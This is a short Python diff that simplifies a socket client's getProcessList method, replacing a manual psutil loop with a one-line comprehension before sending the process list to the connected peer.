@@ -37,15 +37,8 @@ class Client(object):
 
     # getting info of all processes running in the moment
     def getProcessList(self, args):
-        data = []
-        for process in process_iter():
-            try:
-                data.append({"pid": str(process.pid), "user": process.username(), "name": process.name(), "exe": process.exe(), "cwd": process.cwd()})
-            except AccessDenied:
-                data.append({"pid": str(process.pid), "user": process.username(), "name": process.name(), "exe": "", "cwd": ""})
-            except ZombieProcess:
-                data.append({"pid": str(process.pid), "user": process.username(), "name": process.name(), "exe": "", "cwd": ""})
-        
+        data = [proc.info for proc in process_iter(['pid', 'username', 'name', 'exe', 'cwd'])]
+
         self.sendHeader({"total": len(data), "bytes": len(dumps(data))})
         sleep(0.5)
         self.__Client.send(dumps(data))
